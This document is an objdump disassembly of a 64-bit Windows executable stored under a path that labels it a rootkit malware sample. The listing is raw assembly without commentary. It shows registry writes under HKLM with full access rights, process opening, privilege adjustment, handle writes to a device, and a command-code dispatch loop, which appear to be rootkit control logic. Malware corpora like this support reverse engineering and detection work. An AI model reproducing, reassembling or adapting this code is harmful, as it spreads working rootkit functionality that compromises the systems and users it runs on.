
malware_samples/rootkit/044d94183a778f39e47f255fcb985d20bfd885771a74217cfbca9e63d7d9936d.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001005:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000100a:	55                   	push   %rbp
   14000100b:	48 8d ac 24 50 ff ff 	lea    -0xb0(%rsp),%rbp
   140001012:	ff 
   140001013:	48 81 ec b0 01 00 00 	sub    $0x1b0,%rsp
   14000101a:	48 8b 05 df 8f 01 00 	mov    0x18fdf(%rip),%rax        # 0x14001a000
   140001021:	48 33 c4             	xor    %rsp,%rax
   140001024:	48 89 85 a0 00 00 00 	mov    %rax,0xa0(%rbp)
   14000102b:	48 8d 0d 7e 58 01 00 	lea    0x1587e(%rip),%rcx        # 0x1400168b0
   140001032:	e8 89 17 00 00       	call   0x1400027c0
   140001037:	33 ff                	xor    %edi,%edi
   140001039:	c7 45 80 1c 01 00 00 	movl   $0x11c,-0x80(%rbp)
   140001040:	33 d2                	xor    %edx,%edx
   140001042:	48 89 7d 8c          	mov    %rdi,-0x74(%rbp)
   140001046:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   14000104c:	48 8d 4d 94          	lea    -0x6c(%rbp),%rcx
   140001050:	e8 7b 36 00 00       	call   0x1400046d0
   140001055:	33 c0                	xor    %eax,%eax
   140001057:	66 89 bd 96 00 00 00 	mov    %di,0x96(%rbp)
   14000105e:	41 b0 03             	mov    $0x3,%r8b
   140001061:	89 85 98 00 00 00    	mov    %eax,0x98(%rbp)
   140001067:	8d 57 02             	lea    0x2(%rdi),%edx
   14000106a:	33 c9                	xor    %ecx,%ecx
   14000106c:	ff 15 8e e1 00 00    	call   *0xe18e(%rip)        # 0x14000f200
   140001072:	41 b0 03             	mov    $0x3,%r8b
   140001075:	8d 57 01             	lea    0x1(%rdi),%edx
   140001078:	48 8b c8             	mov    %rax,%rcx
   14000107b:	ff 15 7f e1 00 00    	call   *0xe17f(%rip)        # 0x14000f200
   140001081:	41 b0 03             	mov    $0x3,%r8b
   140001084:	8d 57 20             	lea    0x20(%rdi),%edx
   140001087:	48 8b c8             	mov    %rax,%rcx
   14000108a:	ff 15 70 e1 00 00    	call   *0xe170(%rip)        # 0x14000f200
   140001090:	8d 57 23             	lea    0x23(%rdi),%edx
   140001093:	48 c7 45 84 0a 00 00 	movq   $0xa,-0x7c(%rbp)
   14000109a:	00 
   14000109b:	4c 8b c0             	mov    %rax,%r8
   14000109e:	66 89 bd 94 00 00 00 	mov    %di,0x94(%rbp)
   1400010a5:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1400010a9:	ff 15 41 e1 00 00    	call   *0xe141(%rip)        # 0x14000f1f0
   1400010af:	48 8d 0d 12 58 01 00 	lea    0x15812(%rip),%rcx        # 0x1400168c8
   1400010b6:	e8 05 17 00 00       	call   0x1400027c0
   1400010bb:	33 c9                	xor    %ecx,%ecx
   1400010bd:	e8 be 46 00 00       	call   0x140005780
   1400010c2:	48 8b c8             	mov    %rax,%rcx
   1400010c5:	e8 9e 46 00 00       	call   0x140005768
   1400010ca:	ff 15 28 e1 00 00    	call   *0xe128(%rip)        # 0x14000f1f8
   1400010d0:	33 d2                	xor    %edx,%edx
   1400010d2:	b9 10 04 00 00       	mov    $0x410,%ecx
   1400010d7:	44 8b c0             	mov    %eax,%r8d
   1400010da:	ff 15 e0 df 00 00    	call   *0xdfe0(%rip)        # 0x14000f0c0
   1400010e0:	48 8b d8             	mov    %rax,%rbx
   1400010e3:	48 85 c0             	test   %rax,%rax
   1400010e6:	74 7a                	je     0x140001162
   1400010e8:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400010ed:	48 8b c8             	mov    %rax,%rcx
   1400010f0:	8d 57 28             	lea    0x28(%rdi),%edx
   1400010f3:	ff 15 5f df 00 00    	call   *0xdf5f(%rip)        # 0x14000f058
   1400010f9:	85 c0                	test   %eax,%eax
   1400010fb:	74 5c                	je     0x140001159
   1400010fd:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140001102:	33 c9                	xor    %ecx,%ecx
   140001104:	48 8d 15 bd 58 01 00 	lea    0x158bd(%rip),%rdx        # 0x1400169c8
   14000110b:	ff 15 ef de 00 00    	call   *0xdeef(%rip)        # 0x14000f000
   140001111:	85 c0                	test   %eax,%eax
   140001113:	74 44                	je     0x140001159
   140001115:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   14000111a:	44 8d 4f 10          	lea    0x10(%rdi),%r9d
   14000111e:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001123:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   140001128:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   14000112d:	33 d2                	xor    %edx,%edx
   14000112f:	48 89 44 24 6c       	mov    %rax,0x6c(%rsp)
   140001134:	c7 44 24 68 01 00 00 	movl   $0x1,0x68(%rsp)
   14000113b:	00 
   14000113c:	c7 44 24 74 02 00 00 	movl   $0x2,0x74(%rsp)
   140001143:	00 
   140001144:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001149:	ff 15 c1 de 00 00    	call   *0xdec1(%rip)        # 0x14000f010
   14000114f:	85 c0                	test   %eax,%eax
   140001151:	74 06                	je     0x140001159
   140001153:	ff 15 77 df 00 00    	call   *0xdf77(%rip)        # 0x14000f0d0
   140001159:	48 8b cb             	mov    %rbx,%rcx
   14000115c:	ff 15 b6 e0 00 00    	call   *0xe0b6(%rip)        # 0x14000f218
   140001162:	4c 8d 05 7b 57 01 00 	lea    0x1577b(%rip),%r8        # 0x1400168e4
   140001169:	ba 65 00 00 00       	mov    $0x65,%edx
   14000116e:	33 c9                	xor    %ecx,%ecx
   140001170:	ff 15 32 e0 00 00    	call   *0xe032(%rip)        # 0x14000f1a8
   140001176:	48 8b d8             	mov    %rax,%rbx
   140001179:	48 85 c0             	test   %rax,%rax
   14000117c:	0f 84 eb 01 00 00    	je     0x14000136d
   140001182:	48 8b d0             	mov    %rax,%rdx
   140001185:	33 c9                	xor    %ecx,%ecx
   140001187:	ff 15 5b e0 00 00    	call   *0xe05b(%rip)        # 0x14000f1e8
   14000118d:	89 05 ad aa 01 00    	mov    %eax,0x1aaad(%rip)        # 0x14001bc40
   140001193:	85 c0                	test   %eax,%eax
   140001195:	0f 84 d2 01 00 00    	je     0x14000136d
   14000119b:	48 8b d3             	mov    %rbx,%rdx
   14000119e:	33 c9                	xor    %ecx,%ecx
   1400011a0:	ff 15 52 df 00 00    	call   *0xdf52(%rip)        # 0x14000f0f8
   1400011a6:	48 85 c0             	test   %rax,%rax
   1400011a9:	0f 84 be 01 00 00    	je     0x14000136d
   1400011af:	48 8b c8             	mov    %rax,%rcx
   1400011b2:	ff 15 28 df 00 00    	call   *0xdf28(%rip)        # 0x14000f0e0
   1400011b8:	48 89 05 89 aa 01 00 	mov    %rax,0x1aa89(%rip)        # 0x14001bc48
   1400011bf:	ff 15 33 e0 00 00    	call   *0xe033(%rip)        # 0x14000f1f8
   1400011c5:	8b c8                	mov    %eax,%ecx
   1400011c7:	e8 c4 1b 00 00       	call   0x140002d90
   1400011cc:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   1400011d1:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400011d6:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400011db:	48 8d 15 ae 58 01 00 	lea    0x158ae(%rip),%rdx        # 0x140016a90
   1400011e2:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400011e7:	45 33 c9             	xor    %r9d,%r9d
   1400011ea:	c7 44 24 28 3f 01 0f 	movl   $0xf013f,0x28(%rsp)
   1400011f1:	00 
   1400011f2:	45 33 c0             	xor    %r8d,%r8d
   1400011f5:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   1400011fc:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140001200:	ff 15 7a de 00 00    	call   *0xde7a(%rip)        # 0x14000f080
   140001206:	85 c0                	test   %eax,%eax
   140001208:	0f 85 d0 00 00 00    	jne    0x1400012de
   14000120e:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140001213:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140001218:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   14000121d:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   140001221:	8d 50 01             	lea    0x1(%rax),%edx
   140001224:	48 8d 0d 95 58 01 00 	lea    0x15895(%rip),%rcx        # 0x140016ac0
   14000122b:	ff 15 37 de 00 00    	call   *0xde37(%rip)        # 0x14000f068
   140001231:	85 c0                	test   %eax,%eax
   140001233:	74 20                	je     0x140001255
   140001235:	4c 8b 44 24 60       	mov    0x60(%rsp),%r8
   14000123a:	ba 04 00 00 00       	mov    $0x4,%edx
   14000123f:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001244:	ff 15 06 de 00 00    	call   *0xde06(%rip)        # 0x14000f050
   14000124a:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000124f:	ff 15 c3 de 00 00    	call   *0xdec3(%rip)        # 0x14000f118
   140001255:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000125a:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000125f:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140001264:	48 8d 15 7d 56 01 00 	lea    0x1567d(%rip),%rdx        # 0x1400168e8
   14000126b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001270:	45 33 c9             	xor    %r9d,%r9d
   140001273:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001278:	45 33 c0             	xor    %r8d,%r8d
   14000127b:	c7 44 24 28 3f 01 0f 	movl   $0xf013f,0x28(%rsp)
   140001282:	00 
   140001283:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140001287:	ff 15 f3 dd 00 00    	call   *0xddf3(%rip)        # 0x14000f080
   14000128d:	85 c0                	test   %eax,%eax
   14000128f:	75 42                	jne    0x1400012d3
   140001291:	ff 15 61 df 00 00    	call   *0xdf61(%rip)        # 0x14000f1f8
   140001297:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000129c:	48 8d 15 4d 56 01 00 	lea    0x1564d(%rip),%rdx        # 0x1400168f0
   1400012a3:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1400012a7:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400012ad:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400012b2:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400012b9:	00 
   1400012ba:	45 33 c0             	xor    %r8d,%r8d
   1400012bd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400012c2:	ff 15 c0 dd 00 00    	call   *0xddc0(%rip)        # 0x14000f088
   1400012c8:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400012cd:	ff 15 a5 dd 00 00    	call   *0xdda5(%rip)        # 0x14000f078
   1400012d3:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400012d8:	ff 15 9a dd 00 00    	call   *0xdd9a(%rip)        # 0x14000f078
   1400012de:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400012e3:	4c 8d 0d b6 00 00 00 	lea    0xb6(%rip),%r9        # 0x1400013a0
   1400012ea:	4c 8d 05 5f 1b 00 00 	lea    0x1b5f(%rip),%r8        # 0x140002e50
   1400012f1:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   1400012f5:	33 d2                	xor    %edx,%edx
   1400012f7:	33 c9                	xor    %ecx,%ecx
   1400012f9:	ff 15 f1 dd 00 00    	call   *0xddf1(%rip)        # 0x14000f0f0
   1400012ff:	b9 10 00 00 00       	mov    $0x10,%ecx
   140001304:	e8 57 1e 00 00       	call   0x140003160
   140001309:	48 8d 0d b0 00 00 00 	lea    0xb0(%rip),%rcx        # 0x1400013c0
   140001310:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001315:	4c 8b c8             	mov    %rax,%r9
   140001318:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000131c:	4c 8d 05 ed 1b 00 00 	lea    0x1bed(%rip),%r8        # 0x140002f10
   140001323:	33 d2                	xor    %edx,%edx
   140001325:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140001329:	33 c9                	xor    %ecx,%ecx
   14000132b:	48 c7 00 64 00 00 00 	movq   $0x64,(%rax)
   140001332:	ff 15 b8 dd 00 00    	call   *0xddb8(%rip)        # 0x14000f0f0
   140001338:	4c 8d 0d a1 00 00 00 	lea    0xa1(%rip),%r9        # 0x1400013e0
   14000133f:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001344:	4c 8d 05 95 1c 00 00 	lea    0x1c95(%rip),%r8        # 0x140002fe0
   14000134b:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000134f:	33 d2                	xor    %edx,%edx
   140001351:	33 c9                	xor    %ecx,%ecx
   140001353:	ff 15 97 dd 00 00    	call   *0xdd97(%rip)        # 0x14000f0f0
   140001359:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001360:	b9 64 00 00 00       	mov    $0x64,%ecx
   140001365:	ff 15 b5 de 00 00    	call   *0xdeb5(%rip)        # 0x14000f220
   14000136b:	eb f3                	jmp    0x140001360
   14000136d:	33 c0                	xor    %eax,%eax
   14000136f:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   140001376:	48 33 cc             	xor    %rsp,%rcx
   140001379:	e8 b2 1d 00 00       	call   0x140003130
   14000137e:	4c 8d 9c 24 b0 01 00 	lea    0x1b0(%rsp),%r11
   140001385:	00 
   140001386:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000138a:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   14000138e:	49 8b e3             	mov    %r11,%rsp
   140001391:	5d                   	pop    %rbp
   140001392:	c3                   	ret
   140001393:	cc                   	int3
   140001394:	cc                   	int3
   140001395:	cc                   	int3
   140001396:	cc                   	int3
   140001397:	cc                   	int3
   140001398:	cc                   	int3
   140001399:	cc                   	int3
   14000139a:	cc                   	int3
   14000139b:	cc                   	int3
   14000139c:	cc                   	int3
   14000139d:	cc                   	int3
   14000139e:	cc                   	int3
   14000139f:	cc                   	int3
   1400013a0:	83 3d 9d a8 01 00 00 	cmpl   $0x0,0x1a89d(%rip)        # 0x14001bc44
   1400013a7:	75 08                	jne    0x1400013b1
   1400013a9:	45 33 c9             	xor    %r9d,%r9d
   1400013ac:	e9 df 0c 00 00       	jmp    0x140002090
   1400013b1:	c3                   	ret
   1400013b2:	cc                   	int3
   1400013b3:	cc                   	int3
   1400013b4:	cc                   	int3
   1400013b5:	cc                   	int3
   1400013b6:	cc                   	int3
   1400013b7:	cc                   	int3
   1400013b8:	cc                   	int3
   1400013b9:	cc                   	int3
   1400013ba:	cc                   	int3
   1400013bb:	cc                   	int3
   1400013bc:	cc                   	int3
   1400013bd:	cc                   	int3
   1400013be:	cc                   	int3
   1400013bf:	cc                   	int3
   1400013c0:	83 3d 7d a8 01 00 00 	cmpl   $0x0,0x1a87d(%rip)        # 0x14001bc44
   1400013c7:	75 0b                	jne    0x1400013d4
   1400013c9:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400013cf:	e9 bc 0c 00 00       	jmp    0x140002090
   1400013d4:	c3                   	ret
   1400013d5:	cc                   	int3
   1400013d6:	cc                   	int3
   1400013d7:	cc                   	int3
   1400013d8:	cc                   	int3
   1400013d9:	cc                   	int3
   1400013da:	cc                   	int3
   1400013db:	cc                   	int3
   1400013dc:	cc                   	int3
   1400013dd:	cc                   	int3
   1400013de:	cc                   	int3
   1400013df:	cc                   	int3
   1400013e0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400013e5:	55                   	push   %rbp
   1400013e6:	56                   	push   %rsi
   1400013e7:	57                   	push   %rdi
   1400013e8:	41 54                	push   %r12
   1400013ea:	41 56                	push   %r14
   1400013ec:	48 8d ac 24 b0 f6 ff 	lea    -0x950(%rsp),%rbp
   1400013f3:	ff 
   1400013f4:	48 81 ec 50 0a 00 00 	sub    $0xa50,%rsp
   1400013fb:	48 8b 05 fe 8b 01 00 	mov    0x18bfe(%rip),%rax        # 0x14001a000
   140001402:	48 33 c4             	xor    %rsp,%rax
   140001405:	48 89 85 40 09 00 00 	mov    %rax,0x940(%rbp)
   14000140c:	4c 8b f2             	mov    %rdx,%r14
   14000140f:	44 8b e1             	mov    %ecx,%r12d
   140001412:	81 f9 02 20 00 00    	cmp    $0x2002,%ecx
   140001418:	0f 87 3f 03 00 00    	ja     0x14000175d
   14000141e:	0f 84 d8 02 00 00    	je     0x1400016fc
   140001424:	8b c1                	mov    %ecx,%eax
   140001426:	2d 01 10 00 00       	sub    $0x1001,%eax
   14000142b:	0f 84 c2 02 00 00    	je     0x1400016f3
   140001431:	83 e8 01             	sub    $0x1,%eax
   140001434:	0f 84 2f 01 00 00    	je     0x140001569
   14000143a:	83 e8 01             	sub    $0x1,%eax
   14000143d:	0f 84 17 01 00 00    	je     0x14000155a
   140001443:	83 e8 01             	sub    $0x1,%eax
   140001446:	0f 84 01 01 00 00    	je     0x14000154d
   14000144c:	3d fd 0f 00 00       	cmp    $0xffd,%eax
   140001451:	0f 85 4b 07 00 00    	jne    0x140001ba2
   140001457:	33 db                	xor    %ebx,%ebx
   140001459:	4c 8d 4c 24 54       	lea    0x54(%rsp),%r9
   14000145e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140001463:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001468:	49 8b ce             	mov    %r14,%rcx
   14000146b:	44 8d 43 04          	lea    0x4(%rbx),%r8d
   14000146f:	ff 15 cb dd 00 00    	call   *0xddcb(%rip)        # 0x14000f240
   140001475:	85 c0                	test   %eax,%eax
   140001477:	0f 84 25 07 00 00    	je     0x140001ba2
   14000147d:	83 7c 24 54 04       	cmpl   $0x4,0x54(%rsp)
   140001482:	0f 85 1a 07 00 00    	jne    0x140001ba2
   140001488:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   14000148d:	33 d2                	xor    %edx,%edx
   14000148f:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140001494:	ff 15 26 dc 00 00    	call   *0xdc26(%rip)        # 0x14000f0c0
   14000149a:	48 8b f0             	mov    %rax,%rsi
   14000149d:	48 85 c0             	test   %rax,%rax
   1400014a0:	0f 84 fc 06 00 00    	je     0x140001ba2
   1400014a6:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   1400014ab:	48 8b c8             	mov    %rax,%rcx
   1400014ae:	ff 15 d4 dc 00 00    	call   *0xdcd4(%rip)        # 0x14000f188
   1400014b4:	48 8b ce             	mov    %rsi,%rcx
   1400014b7:	85 c0                	test   %eax,%eax
   1400014b9:	0f 84 dd 06 00 00    	je     0x140001b9c
   1400014bf:	39 5c 24 48          	cmp    %ebx,0x48(%rsp)
   1400014c3:	8b fb                	mov    %ebx,%edi
   1400014c5:	40 0f 94 c7          	sete   %dil
   1400014c9:	ff 15 49 dd 00 00    	call   *0xdd49(%rip)        # 0x14000f218
   1400014cf:	83 ff 01             	cmp    $0x1,%edi
   1400014d2:	75 11                	jne    0x1400014e5
   1400014d4:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   1400014d8:	44 8b cf             	mov    %edi,%r9d
   1400014db:	e8 b0 0b 00 00       	call   0x140002090
   1400014e0:	e9 bd 06 00 00       	jmp    0x140001ba2
   1400014e5:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400014ea:	48 8d 0d 6f 54 01 00 	lea    0x1546f(%rip),%rcx        # 0x140016960
   1400014f1:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400014f5:	45 33 c9             	xor    %r9d,%r9d
   1400014f8:	45 33 c0             	xor    %r8d,%r8d
   1400014fb:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140001502:	00 
   140001503:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   140001508:	44 89 64 24 48       	mov    %r12d,0x48(%rsp)
   14000150d:	ff 15 15 dd 00 00    	call   *0xdd15(%rip)        # 0x14000f228
   140001513:	48 8b f8             	mov    %rax,%rdi
   140001516:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000151a:	0f 84 82 06 00 00    	je     0x140001ba2
   140001520:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140001525:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000152a:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001530:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140001535:	48 8b c8             	mov    %rax,%rcx
   140001538:	ff 15 f2 dc 00 00    	call   *0xdcf2(%rip)        # 0x14000f230
   14000153e:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140001543:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140001548:	e9 38 06 00 00       	jmp    0x140001b85
   14000154d:	33 db                	xor    %ebx,%ebx
   14000154f:	89 1d ef a6 01 00    	mov    %ebx,0x1a6ef(%rip)        # 0x14001bc44
   140001555:	e9 48 06 00 00       	jmp    0x140001ba2
   14000155a:	c7 05 e0 a6 01 00 01 	movl   $0x1,0x1a6e0(%rip)        # 0x14001bc44
   140001561:	00 00 00 
   140001564:	e9 39 06 00 00       	jmp    0x140001ba2
   140001569:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000156e:	41 b9 3f 01 0f 00    	mov    $0xf013f,%r9d
   140001574:	45 33 c0             	xor    %r8d,%r8d
   140001577:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000157c:	48 8d 15 8d 53 01 00 	lea    0x1538d(%rip),%rdx        # 0x140016910
   140001583:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000158a:	ff 15 00 db 00 00    	call   *0xdb00(%rip)        # 0x14000f090
   140001590:	85 c0                	test   %eax,%eax
   140001592:	75 12                	jne    0x1400015a6
   140001594:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140001599:	48 8d 15 88 53 01 00 	lea    0x15388(%rip),%rdx        # 0x140016928
   1400015a0:	ff 15 f2 da 00 00    	call   *0xdaf2(%rip)        # 0x14000f098
   1400015a6:	33 c9                	xor    %ecx,%ecx
   1400015a8:	ff 15 7a de 00 00    	call   *0xde7a(%rip)        # 0x14000f428
   1400015ae:	33 db                	xor    %ebx,%ebx
   1400015b0:	85 c0                	test   %eax,%eax
   1400015b2:	78 50                	js     0x140001604
   1400015b4:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400015b9:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400015be:	4c 8d 0d f3 53 01 00 	lea    0x153f3(%rip),%r9        # 0x1400169b8
   1400015c5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400015ca:	33 d2                	xor    %edx,%edx
   1400015cc:	44 8d 43 01          	lea    0x1(%rbx),%r8d
   1400015d0:	48 8d 0d d1 53 01 00 	lea    0x153d1(%rip),%rcx        # 0x1400169a8
   1400015d7:	ff 15 5b de 00 00    	call   *0xde5b(%rip)        # 0x14000f438
   1400015dd:	85 c0                	test   %eax,%eax
   1400015df:	78 1d                	js     0x1400015fe
   1400015e1:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400015e6:	48 8d 15 5b 53 01 00 	lea    0x1535b(%rip),%rdx        # 0x140016948
   1400015ed:	48 8b 01             	mov    (%rcx),%rax
   1400015f0:	ff 50 38             	call   *0x38(%rax)
   1400015f3:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400015f8:	48 8b 01             	mov    (%rcx),%rax
   1400015fb:	ff 50 10             	call   *0x10(%rax)
   1400015fe:	ff 15 2c de 00 00    	call   *0xde2c(%rip)        # 0x14000f430
   140001604:	e8 f7 16 00 00       	call   0x140002d00
   140001609:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000160e:	41 b9 3f 01 0f 00    	mov    $0xf013f,%r9d
   140001614:	45 33 c0             	xor    %r8d,%r8d
   140001617:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000161c:	48 8d 15 6d 54 01 00 	lea    0x1546d(%rip),%rdx        # 0x140016a90
   140001623:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000162a:	ff 15 60 da 00 00    	call   *0xda60(%rip)        # 0x14000f090
   140001630:	85 c0                	test   %eax,%eax
   140001632:	0f 85 8f 00 00 00    	jne    0x1400016c7
   140001638:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000163d:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140001642:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140001647:	4c 8d 85 70 01 00 00 	lea    0x170(%rbp),%r8
   14000164e:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001653:	33 d2                	xor    %edx,%edx
   140001655:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000165a:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000165f:	c7 44 24 50 e8 03 00 	movl   $0x3e8,0x50(%rsp)
   140001666:	00 
   140001667:	ff 15 db d9 00 00    	call   *0xd9db(%rip)        # 0x14000f048
   14000166d:	85 c0                	test   %eax,%eax
   14000166f:	75 4b                	jne    0x1400016bc
   140001671:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140001676:	48 8d 95 70 01 00 00 	lea    0x170(%rbp),%rdx
   14000167d:	ff 15 a5 d9 00 00    	call   *0xd9a5(%rip)        # 0x14000f028
   140001683:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140001688:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000168d:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140001692:	4c 8d 85 70 01 00 00 	lea    0x170(%rbp),%r8
   140001699:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000169e:	33 d2                	xor    %edx,%edx
   1400016a0:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400016a5:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400016aa:	c7 44 24 50 e8 03 00 	movl   $0x3e8,0x50(%rsp)
   1400016b1:	00 
   1400016b2:	ff 15 90 d9 00 00    	call   *0xd990(%rip)        # 0x14000f048
   1400016b8:	85 c0                	test   %eax,%eax
   1400016ba:	74 b5                	je     0x140001671
   1400016bc:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400016c1:	ff 15 b1 d9 00 00    	call   *0xd9b1(%rip)        # 0x14000f078
   1400016c7:	45 33 c9             	xor    %r9d,%r9d
   1400016ca:	48 8d 15 bf 53 01 00 	lea    0x153bf(%rip),%rdx        # 0x140016a90
   1400016d1:	41 b8 3f 01 0f 00    	mov    $0xf013f,%r8d
   1400016d7:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   1400016de:	ff 15 34 d9 00 00    	call   *0xd934(%rip)        # 0x14000f018
   1400016e4:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400016e9:	e8 a2 16 00 00       	call   0x140002d90
   1400016ee:	e9 af 04 00 00       	jmp    0x140001ba2
   1400016f3:	33 c9                	xor    %ecx,%ecx
   1400016f5:	ff 15 0d db 00 00    	call   *0xdb0d(%rip)        # 0x14000f208
   1400016fb:	cc                   	int3
   1400016fc:	b9 40 9c 00 00       	mov    $0x9c40,%ecx
   140001701:	e8 52 1a 00 00       	call   0x140003158
   140001706:	33 db                	xor    %ebx,%ebx
   140001708:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000170d:	ba 40 9c 00 00       	mov    $0x9c40,%edx
   140001712:	89 5c 24 50          	mov    %ebx,0x50(%rsp)
   140001716:	48 8b c8             	mov    %rax,%rcx
   140001719:	48 8b f8             	mov    %rax,%rdi
   14000171c:	ff 15 ee da 00 00    	call   *0xdaee(%rip)        # 0x14000f210
   140001722:	85 c0                	test   %eax,%eax
   140001724:	0f 84 78 04 00 00    	je     0x140001ba2
   14000172a:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000172e:	c1 e9 02             	shr    $0x2,%ecx
   140001731:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140001735:	85 c9                	test   %ecx,%ecx
   140001737:	0f 84 65 04 00 00    	je     0x140001ba2
   14000173d:	0f 1f 00             	nopl   (%rax)
   140001740:	8b c3                	mov    %ebx,%eax
   140001742:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001748:	8b 0c 87             	mov    (%rdi,%rax,4),%ecx
   14000174b:	e8 40 09 00 00       	call   0x140002090
   140001750:	ff c3                	inc    %ebx
   140001752:	3b 5c 24 50          	cmp    0x50(%rsp),%ebx
   140001756:	72 e8                	jb     0x140001740
   140001758:	e9 45 04 00 00       	jmp    0x140001ba2
   14000175d:	41 8b c4             	mov    %r12d,%eax
   140001760:	2d 03 20 00 00       	sub    $0x2003,%eax
   140001765:	0f 84 cb 02 00 00    	je     0x140001a36
   14000176b:	83 e8 01             	sub    $0x1,%eax
   14000176e:	0f 84 b8 02 00 00    	je     0x140001a2c
   140001774:	2d fd 0f 00 00       	sub    $0xffd,%eax
   140001779:	0f 84 bf 01 00 00    	je     0x14000193e
   14000177f:	83 e8 01             	sub    $0x1,%eax
   140001782:	74 32                	je     0x1400017b6
   140001784:	3d ff 0f 00 00       	cmp    $0xfff,%eax
   140001789:	0f 85 13 04 00 00    	jne    0x140001ba2
